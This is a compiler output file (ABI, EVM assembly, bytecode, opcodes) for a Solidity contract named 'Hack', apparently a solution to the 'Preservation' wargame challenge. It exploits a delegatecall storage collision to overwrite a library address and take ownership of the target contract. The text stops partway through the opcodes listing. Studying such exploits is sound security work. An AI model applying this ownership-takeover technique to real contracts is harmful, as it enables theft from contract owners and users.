{
	"contracts/Preservation.sol": {
		"Hack": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "contract IPreservation",
							"name": "target",
							"type": "address"
						}
					],
					"name": "attack",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "owner",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "uint256",
							"name": "_owner",
							"type": "uint256"
						}
					],
					"name": "setTime",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "timeZone1Library",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "timeZone2Library",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contracts/Preservation.sol\":183:902  contract Hack {... */\n  mstore(0x40, 0x80)\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  revert(0x00, 0x00)\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/Preservation.sol\":183:902  contract Hack {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      revert(0x00, 0x00)\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x27d6974f\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x3beb26c4\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x3dc79422\n      eq\n      tag_5\n      jumpi\n      dup1\n      0x8da5cb5b\n      eq\n      tag_6\n      jumpi\n      dup1\n      0xd018db3e\n      eq\n      tag_7\n      jumpi\n    tag_2:\n      revert(0x00, 0x00)\n        /* \"contracts/Preservation.sol\":289:320  address public timeZone2Library */\n    tag_3:\n      tag_8\n      tag_9\n      jump\t// in\n    tag_8:\n      mload(0x40)\n      tag_10\n      swap2\n      swap1\n      tag_11\n      jump\t// in\n    tag_10:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Preservation.sol\":811:900  function setTime(uint256 _owner) public {... */\n    tag_4:\n      tag_12\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_13\n      swap2\n      swap1\n      tag_14\n      jump\t// in\n    tag_13:\n      tag_15\n      jump\t// in\n    tag_12:\n      stop\n        /* \"contracts/Preservation.sol\":252:283  address public timeZone1Library */\n    tag_5:\n      tag_16\n      tag_17\n      jump\t// in\n    tag_16:\n      mload(0x40)\n      tag_18\n      swap2\n      swap1\n      tag_11\n      jump\t// in\n    tag_18:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Preservation.sol\":326:346  address public owner */\n    tag_6:\n      tag_19\n      tag_20\n      jump\t// in\n    tag_19:\n      mload(0x40)\n      tag_21\n      swap2\n      swap1\n      tag_11\n      jump\t// in\n    tag_21:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Preservation.sol\":353:805  function attack(IPreservation target) external {... */\n    tag_7:\n      tag_22\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_23\n      swap2\n      swap1\n      tag_24\n      jump\t// in\n    tag_23:\n      tag_25\n      jump\t// in\n    tag_22:\n      stop\n        /* \"contracts/Preservation.sol\":289:320  address public timeZone2Library */\n    tag_9:\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"contracts/Preservation.sol\":811:900  function setTime(uint256 _owner) public {... */\n    tag_15:\n        /* \"contracts/Preservation.sol\":885:891  _owner */\n      dup1\n        /* \"contracts/Preservation.sol\":861:866  owner */\n      0x02\n      0x00\n        /* \"contracts/Preservation.sol\":861:893  owner = address(uint160(_owner)) */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xffffffffffffffffffffffffffffffffffffffff\n      mul\n      not\n      and\n      swap1\n      dup4\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"contracts/Preservation.sol\":811:900  function setTime(uint256 _owner) public {... */\n      pop\n      jump\t// out\n        /* \"contracts/Preservation.sol\":252:283  address public timeZone1Library */\n    tag_17:\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"contracts/Preservation.sol\":326:346  address public owner */\n    tag_20:\n      0x02\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"contracts/Preservation.sol\":353:805  function attack(IPreservation target) external {... */\n    tag_25:\n        /* \"contracts/Preservation.sol\":450:456  target */\n      dup1\n        /* \"contracts/Preservation.sol\":450:469  target.setFirstTime */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xf1e02620\n        /* \"contracts/Preservation.sol\":494:498  this */\n      address\n        /* \"contracts/Preservation.sol\":470:501  uint256(uint160(address(this))) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Preservation.sol\":450:502  target.setFirstTime(uint256(uint160(address(this)))) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_28\n      swap2\n      swap1\n      tag_29\n      jump\t// in\n    tag_28:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_30\n      jumpi\n      revert(0x00, 0x00)\n    tag_30:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_32\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_32:\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/Preservation.sol\":687:693  target */\n      dup1\n        /* \"contracts/Preservation.sol\":687:706  target.setFirstTime */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xf1e02620\n        /* \"contracts/Preservation.sol\":723:733  msg.sender */\n      caller\n        /* \"contracts/Preservation.sol\":707:735  uint256(uint160(msg.sender)) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Preservation.sol\":687:736  target.setFirstTime(uint256(uint160(msg.sender))) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_33\n      swap2\n      swap1\n      tag_29\n      jump\t// in\n    tag_33:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_34\n      jumpi\n      revert(0x00, 0x00)\n    tag_34:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_36\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_36:\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/Preservation.sol\":772:782  msg.sender */\n      caller\n        /* \"contracts/Preservation.sol\":754:782  target.owner() == msg.sender */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Preservation.sol\":754:760  target */\n      dup2\n        /* \"contracts/Preservation.sol\":754:766  target.owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x8da5cb5b\n        /* \"contracts/Preservation.sol\":754:768  target.owner() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_38\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_38:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_39\n      swap2\n      swap1\n      tag_40\n      jump\t// in\n    tag_39:\n        /* \"contracts/Preservation.sol\":754:782  target.owner() == msg.sender */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"contracts/Preservation.sol\":746:798  require(target.owner() == msg.sender, \"hack failed\") */\n      tag_41\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_42\n      swap1\n      tag_43\n      jump\t// in\n    tag_42:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_41:\n        /* \"contracts/Preservation.sol\":353:805  function attack(IPreservation target) external {... */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7:133   */\n    tag_44:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":84:126   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":77:82   */\n      dup3\n        /* \"#utility.yul\":73:127   */\n      and\n        /* \"#utility.yul\":62:127   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:133   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":139:235   */\n    tag_45:\n        /* \"#utility.yul\":176:183   */\n      0x00\n        /* \"#utility.yul\":205:229   */\n      tag_65\n        /* \"#utility.yul\":223:228   */\n      dup3\n        /* \"#utility.yul\":205:229   */\n      tag_44\n      jump\t// in\n    tag_65:\n        /* \"#utility.yul\":194:229   */\n      swap1\n      pop\n        /* \"#utility.yul\":139:235   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":241:359   */\n    tag_46:\n        /* \"#utility.yul\":328:352   */\n      tag_67\n        /* \"#utility.yul\":346:351   */\n      dup2\n        /* \"#utility.yul\":328:352   */\n      tag_45\n      jump\t// in\n    tag_67:\n        /* \"#utility.yul\":323:326   */\n      dup3\n        /* \"#utility.yul\":316:353   */\n      mstore\n        /* \"#utility.yul\":241:359   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":365:587   */\n    tag_11:\n        /* \"#utility.yul\":458:462   */\n      0x00\n        /* \"#utility.yul\":496:498   */\n      0x20\n        /* \"#utility.yul\":485:494   */\n      dup3\n        /* \"#utility.yul\":481:499   */\n      add\n        /* \"#utility.yul\":473:499   */\n      swap1\n      pop\n        /* \"#utility.yul\":509:580   */\n      tag_69\n        /* \"#utility.yul\":577:578   */\n      0x00\n        /* \"#utility.yul\":566:575   */\n      dup4\n        /* \"#utility.yul\":562:579   */\n      add\n        /* \"#utility.yul\":553:559   */\n      dup5\n        /* \"#utility.yul\":509:580   */\n      tag_46\n      jump\t// in\n    tag_69:\n        /* \"#utility.yul\":365:587   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":674:791   */\n    tag_48:\n        /* \"#utility.yul\":783:784   */\n      0x00\n        /* \"#utility.yul\":780:781   */\n      0x00\n        /* \"#utility.yul\":773:785   */\n      revert\n        /* \"#utility.yul\":920:997   */\n    tag_50:\n        /* \"#utility.yul\":957:964   */\n      0x00\n        /* \"#utility.yul\":986:991   */\n      dup2\n        /* \"#utility.yul\":975:991   */\n      swap1\n      pop\n        /* \"#utility.yul\":920:997   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1003:1125   */\n    tag_51:\n        /* \"#utility.yul\":1076:1100   */\n      tag_75\n        /* \"#utility.yul\":1094:1099   */\n      dup2\n        /* \"#utility.yul\":1076:1100   */\n      tag_50\n      jump\t// in\n    tag_75:\n        /* \"#utility.yul\":1069:1074   */\n      dup2\n        /* \"#utility.yul\":1066:1101   */\n      eq\n        /* \"#utility.yul\":1056:1119   */\n      tag_76\n      jumpi\n        /* \"#utility.yul\":1115:1116   */\n      0x00\n        /* \"#utility.yul\":1112:1113   */\n      0x00\n        /* \"#utility.yul\":1105:1117   */\n      revert\n        /* \"#utility.yul\":1056:1119   */\n    tag_76:\n        /* \"#utility.yul\":1003:1125   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1131:1270   */\n    tag_52:\n        /* \"#utility.yul\":1177:1182   */\n      0x00\n        /* \"#utility.yul\":1215:1221   */\n      dup2\n        /* \"#utility.yul\":1202:1222   */\n      calldataload\n        /* \"#utility.yul\":1193:1222   */\n      swap1\n      pop\n        /* \"#utility.yul\":1231:1264   */\n      tag_78\n        /* \"#utility.yul\":1258:1263   */\n      dup2\n        /* \"#utility.yul\":1231:1264   */\n      tag_51\n      jump\t// in\n    tag_78:\n        /* \"#utility.yul\":1131:1270   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1276:1605   */\n    tag_14:\n        /* \"#utility.yul\":1335:1341   */\n      0x00\n        /* \"#utility.yul\":1384:1386   */\n      0x20\n        /* \"#utility.yul\":1372:1381   */\n      dup3\n        /* \"#utility.yul\":1363:1370   */\n      dup5\n        /* \"#utility.yul\":1359:1382   */\n      sub\n        /* \"#utility.yul\":1355:1387   */\n      slt\n        /* \"#utility.yul\":1352:1471   */\n      iszero\n      tag_80\n      jumpi\n        /* \"#utility.yul\":1390:1469   */\n      tag_81\n      tag_48\n      jump\t// in\n    tag_81:\n        /* \"#utility.yul\":1352:1471   */\n    tag_80:\n        /* \"#utility.yul\":1510:1511   */\n      0x00\n        /* \"#utility.yul\":1535:1588   */\n      tag_82\n        /* \"#utility.yul\":1580:1587   */\n      dup5\n        /* \"#utility.yul\":1571:1577   */\n      dup3\n        /* \"#utility.yul\":1560:1569   */\n      dup6\n        /* \"#utility.yul\":1556:1578   */\n      add\n        /* \"#utility.yul\":1535:1588   */\n      tag_52\n      jump\t// in\n    tag_82:\n        /* \"#utility.yul\":1525:1588   */\n      swap2\n      pop\n        /* \"#utility.yul\":1481:1598   */\n      pop\n        /* \"#utility.yul\":1276:1605   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1611:1727   */\n    tag_53:\n        /* \"#utility.yul\":1668:1675   */\n      0x00\n        /* \"#utility.yul\":1697:1721   */\n      tag_84\n        /* \"#utility.yul\":1715:1720   */\n      dup3\n        /* \"#utility.yul\":1697:1721   */\n      tag_45\n      jump\t// in\n    tag_84:\n        /* \"#utility.yul\":1686:1721   */\n      swap1\n      pop\n        /* \"#utility.yul\":1611:1727   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1733:1895   */\n    tag_54:\n        /* \"#utility.yul\":1826:1870   */\n      tag_86\n        /* \"#utility.yul\":1864:1869   */\n      dup2\n        /* \"#utility.yul\":1826:1870   */\n      tag_53\n      jump\t// in\n    tag_86:\n        /* \"#utility.yul\":1819:1824   */\n      dup2\n        /* \"#utility.yul\":1816:1871   */\n      eq\n        /* \"#utility.yul\":1806:1889   */\n      tag_87\n      jumpi\n        /* \"#utility.yul\":1885:1886   */\n      0x00\n        /* \"#utility.yul\":1882:1883   */\n      0x00\n        /* \"#utility.yul\":1875:1887   */\n      revert\n        /* \"#utility.yul\":1806:1889   */\n    tag_87:\n        /* \"#utility.yul\":1733:1895   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1901:2080   */\n    tag_55:\n        /* \"#utility.yul\":1967:1972   */\n      0x00\n        /* \"#utility.yul\":2005:2011   */\n      dup2\n        /* \"#utility.yul\":1992:2012   */\n      calldataload\n        /* \"#utility.yul\":1983:2012   */\n      swap1\n      pop\n        /* \"#utility.yul\":2021:2074   */\n      tag_89\n        /* \"#utility.yul\":2068:2073   */\n      dup2\n        /* \"#utility.yul\":2021:2074   */\n      tag_54\n      jump\t// in\n    tag_89:\n        /* \"#utility.yul\":1901:2080   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2086:2455   */\n    tag_24:\n        /* \"#utility.yul\":2165:2171   */\n      0x00\n        /* \"#utility.yul\":2214:2216   */\n      0x20\n        /* \"#utility.yul\":2202:2211   */\n      dup3\n        /* \"#utility.yul\":2193:2200   */\n      dup5\n        /* \"#utility.yul\":2189:2212   */\n      sub\n        /* \"#utility.yul\":2185:2217   */\n      slt\n        /* \"#utility.yul\":2182:2301   */\n      iszero\n      tag_91\n      jumpi\n        /* \"#utility.yul\":2220:2299   */\n      tag_92\n      tag_48\n      jump\t// in\n    tag_92:\n        /* \"#utility.yul\":2182:2301   */\n    tag_91:\n        /* \"#utility.yul\":2340:2341   */\n      0x00\n        /* \"#utility.yul\":2365:2438   */\n      tag_93\n        /* \"#utility.yul\":2430:2437   */\n      dup5\n        /* \"#utility.yul\":2421:2427   */\n      dup3\n        /* \"#utility.yul\":2410:2419   */\n      dup6\n        /* \"#utility.yul\":2406:2428   */\n      add\n        /* \"#utility.yul\":2365:2438   */\n      tag_55\n      jump\t// in\n    tag_93:\n        /* \"#utility.yul\":2355:2438   */\n      swap2\n      pop\n        /* \"#utility.yul\":2311:2448   */\n      pop\n        /* \"#utility.yul\":2086:2455   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2461:2579   */\n    tag_56:\n        /* \"#utility.yul\":2548:2572   */\n      tag_95\n        /* \"#utility.yul\":2566:2571   */\n      dup2\n        /* \"#utility.yul\":2548:2572   */\n      tag_50\n      jump\t// in\n    tag_95:\n        /* \"#utility.yul\":2543:2546   */\n      dup3\n        /* \"#utility.yul\":2536:2573   */\n      mstore\n        /* \"#utility.yul\":2461:2579   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2585:2807   */\n    tag_29:\n        /* \"#utility.yul\":2678:2682   */\n      0x00\n        /* \"#utility.yul\":2716:2718   */\n      0x20\n        /* \"#utility.yul\":2705:2714   */\n      dup3\n        /* \"#utility.yul\":2701:2719   */\n      add\n        /* \"#utility.yul\":2693:2719   */\n      swap1\n      pop\n        /* \"#utility.yul\":2729:2800   */\n      tag_97\n        /* \"#utility.yul\":2797:2798   */\n      0x00\n        /* \"#utility.yul\":2786:2795   */\n      dup4\n        /* \"#utility.yul\":2782:2799   */\n      add\n        /* \"#utility.yul\":2773:2779   */\n      dup5\n        /* \"#utility.yul\":2729:2800   */\n      tag_56\n      jump\t// in\n    tag_97:\n        /* \"#utility.yul\":2585:2807   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2813:2935   */\n    tag_57:\n        /* \"#utility.yul\":2886:2910   */\n      tag_99\n        /* \"#utility.yul\":2904:2909   */\n      dup2\n        /* \"#utility.yul\":2886:2910   */\n      tag_45\n      jump\t// in\n    tag_99:\n        /* \"#utility.yul\":2879:2884   */\n      dup2\n        /* \"#utility.yul\":2876:2911   */\n      eq\n        /* \"#utility.yul\":2866:2929   */\n      tag_100\n      jumpi\n        /* \"#utility.yul\":2925:2926   */\n      0x00\n        /* \"#utility.yul\":2922:2923   */\n      0x00\n        /* \"#utility.yul\":2915:2927   */\n      revert\n        /* \"#utility.yul\":2866:2929   */\n    tag_100:\n        /* \"#utility.yul\":2813:2935   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2941:3084   */\n    tag_58:\n        /* \"#utility.yul\":2998:3003   */\n      0x00\n        /* \"#utility.yul\":3029:3035   */\n      dup2\n        /* \"#utility.yul\":3023:3036   */\n      mload\n        /* \"#utility.yul\":3014:3036   */\n      swap1\n      pop\n        /* \"#utility.yul\":3045:3078   */\n      tag_102\n        /* \"#utility.yul\":3072:3077   */\n      dup2\n        /* \"#utility.yul\":3045:3078   */\n      tag_57\n      jump\t// in\n    tag_102:\n        /* \"#utility.yul\":2941:3084   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3090:3441   */\n    tag_40:\n        /* \"#utility.yul\":3160:3166   */\n      0x00\n        /* \"#utility.yul\":3209:3211   */\n      0x20\n        /* \"#utility.yul\":3197:3206   */\n      dup3\n        /* \"#utility.yul\":3188:3195   */\n      dup5\n        /* \"#utility.yul\":3184:3207   */\n      sub\n        /* \"#utility.yul\":3180:3212   */\n      slt\n        /* \"#utility.yul\":3177:3296   */\n      iszero\n      tag_104\n      jumpi\n        /* \"#utility.yul\":3215:3294   */\n      tag_105\n      tag_48\n      jump\t// in\n    tag_105:\n        /* \"#utility.yul\":3177:3296   */\n    tag_104:\n        /* \"#utility.yul\":3335:3336   */\n      0x00\n        /* \"#utility.yul\":3360:3424   */\n      tag_106\n        /* \"#utility.yul\":3416:3423   */\n      dup5\n        /* \"#utility.yul\":3407:3413   */\n      dup3\n        /* \"#utility.yul\":3396:3405   */\n      dup6\n        /* \"#utility.yul\":3392:3414   */\n      add\n        /* \"#utility.yul\":3360:3424   */\n      tag_58\n      jump\t// in\n    tag_106:\n        /* \"#utility.yul\":3350:3424   */\n      swap2\n      pop\n        /* \"#utility.yul\":3306:3434   */\n      pop\n        /* \"#utility.yul\":3090:3441   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3447:3616   */\n    tag_59:\n        /* \"#utility.yul\":3531:3542   */\n      0x00\n        /* \"#utility.yul\":3565:3571   */\n      dup3\n        /* \"#utility.yul\":3560:3563   */\n      dup3\n        /* \"#utility.yul\":3553:3572   */\n      mstore\n        /* \"#utility.yul\":3605:3609   */\n      0x20\n        /* \"#utility.yul\":3600:3603   */\n      dup3\n        /* \"#utility.yul\":3596:3610   */\n      add\n        /* \"#utility.yul\":3581:3610   */\n      swap1\n      pop\n        /* \"#utility.yul\":3447:3616   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3622:3783   */\n    tag_60:\n        /* \"#utility.yul\":3762:3775   */\n      0x6861636b206661696c6564000000000000000000000000000000000000000000\n        /* \"#utility.yul\":3758:3759   */\n      0x00\n        /* \"#utility.yul\":3750:3756   */\n      dup3\n        /* \"#utility.yul\":3746:3760   */\n      add\n        /* \"#utility.yul\":3739:3776   */\n      mstore\n        /* \"#utility.yul\":3622:3783   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3789:4155   */\n    tag_61:\n        /* \"#utility.yul\":3931:3934   */\n      0x00\n        /* \"#utility.yul\":3952:4019   */\n      tag_110\n        /* \"#utility.yul\":4016:4018   */\n      0x0b\n        /* \"#utility.yul\":4011:4014   */\n      dup4\n        /* \"#utility.yul\":3952:4019   */\n      tag_59\n      jump\t// in\n    tag_110:\n        /* \"#utility.yul\":3945:4019   */\n      swap2\n      pop\n        /* \"#utility.yul\":4028:4121   */\n      tag_111\n        /* \"#utility.yul\":4117:4120   */\n      dup3\n        /* \"#utility.yul\":4028:4121   */\n      tag_60\n      jump\t// in\n    tag_111:\n        /* \"#utility.yul\":4146:4148   */\n      0x20\n        /* \"#utility.yul\":4141:4144   */\n      dup3\n        /* \"#utility.yul\":4137:4149   */\n      add\n        /* \"#utility.yul\":4130:4149   */\n      swap1\n      pop\n        /* \"#utility.yul\":3789:4155   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4161:4580   */\n    tag_43:\n        /* \"#utility.yul\":4327:4331   */\n      0x00\n        /* \"#utility.yul\":4365:4367   */\n      0x20\n        /* \"#utility.yul\":4354:4363   */\n      dup3\n        /* \"#utility.yul\":4350:4368   */\n      add\n        /* \"#utility.yul\":4342:4368   */\n      swap1\n      pop\n        /* \"#utility.yul\":4414:4423   */\n      dup2\n        /* \"#utility.yul\":4408:4412   */\n      dup2\n        /* \"#utility.yul\":4404:4424   */\n      sub\n        /* \"#utility.yul\":4400:4401   */\n      0x00\n        /* \"#utility.yul\":4389:4398   */\n      dup4\n        /* \"#utility.yul\":4385:4402   */\n      add\n        /* \"#utility.yul\":4378:4425   */\n      mstore\n        /* \"#utility.yul\":4442:4573   */\n      tag_113\n        /* \"#utility.yul\":4568:4572   */\n      dup2\n        /* \"#utility.yul\":4442:4573   */\n      tag_61\n      jump\t// in\n    tag_113:\n        /* \"#utility.yul\":4434:4573   */\n      swap1\n      pop\n        /* \"#utility.yul\":4161:4580   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220208426b3db38562c337cf3450d61b4edb4be42b75c36f33c4cf6284d0a92679f64736f6c634300081c0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "6080604052348015600e575f5ffd5b506105bc8061001c5f395ff3fe608060405234801561000f575f5ffd5b5060043610610055575f3560e01c806327d6974f146100595780633beb26c4146100775780633dc79422146100935780638da5cb5b146100b1578063d018db3e146100cf575b5f5ffd5b6100616100eb565b60405161006e91906103b0565b60405180910390f35b610091600480360381019061008c9190610400565b610110565b005b61009b610153565b6040516100a891906103b0565b60405180910390f35b6100b9610177565b6040516100c691906103b0565b60405180910390f35b6100e960048036038101906100e49190610466565b61019c565b005b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b8060025f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60025f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b8073ffffffffffffffffffffffffffffffffffffffff1663f1e026203073ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b81526004016101eb91906104a0565b5f604051808303815f87803b158015610202575f5ffd5b505af1158015610214573d5f5f3e3d5ffd5b505050508073ffffffffffffffffffffffffffffffffffffffff1663f1e026203373ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b815260040161026791906104a0565b5f604051808303815f87803b15801561027e575f5ffd5b505af1158015610290573d5f5f3e3d5ffd5b505050503373ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16638da5cb5b6040518163ffffffff1660e01b8152600401602060405180830381865afa1580156102f4573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061031891906104e3565b73ffffffffffffffffffffffffffffffffffffffff161461036e576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161036590610568565b60405180910390fd5b50565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61039a82610371565b9050919050565b6103aa81610390565b82525050565b5f6020820190506103c35f8301846103a1565b92915050565b5f5ffd5b5f819050919050565b6103df816103cd565b81146103e9575f5ffd5b50565b5f813590506103fa816103d6565b92915050565b5f60208284031215610415576104146103c9565b5b5f610422848285016103ec565b91505092915050565b5f61043582610390565b9050919050565b6104458161042b565b811461044f575f5ffd5b50565b5f813590506104608161043c565b92915050565b5f6020828403121561047b5761047a6103c9565b5b5f61048884828501610452565b91505092915050565b61049a816103cd565b82525050565b5f6020820190506104b35f830184610491565b92915050565b6104c281610390565b81146104cc575f5ffd5b50565b5f815190506104dd816104b9565b92915050565b5f602082840312156104f8576104f76103c9565b5b5f610505848285016104cf565b91505092915050565b5f82825260208201905092915050565b7f6861636b206661696c65640000000000000000000000000000000000000000005f82015250565b5f610552600b8361050e565b915061055d8261051e565b602082019050919050565b5f6020820190508181035f83015261057f81610546565b905091905056fea2646970667358221220208426b3db38562c337cf3450d61b4edb4be42b75c36f33c4cf6284d0a92679f64736f6c634300081c0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xE JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x5BC DUP1 PUSH2 0x1C PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x55 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x27D6974F EQ PUSH2 0x59 JUMPI DUP1 PUSH4 0x3BEB26C4 EQ PUSH2 0x77 JUMPI DUP1 PUSH4 0x3DC79422 EQ PUSH2 0x93 JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0xB1 JUMPI DUP1 PUSH4 0xD018DB3E EQ PUSH2 0xCF JUMPI JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x61 PUSH2 0xEB JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x6E SWAP2 SWAP1 PUSH2 0x3B0 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x91 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x8C SWAP2 SWAP1 PUSH2 0x400 JUMP JUMPDEST PUSH2 0x110 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x9B PUSH2 0x153 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xA8 SWAP2 SWAP1 PUSH2 0x3B0 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 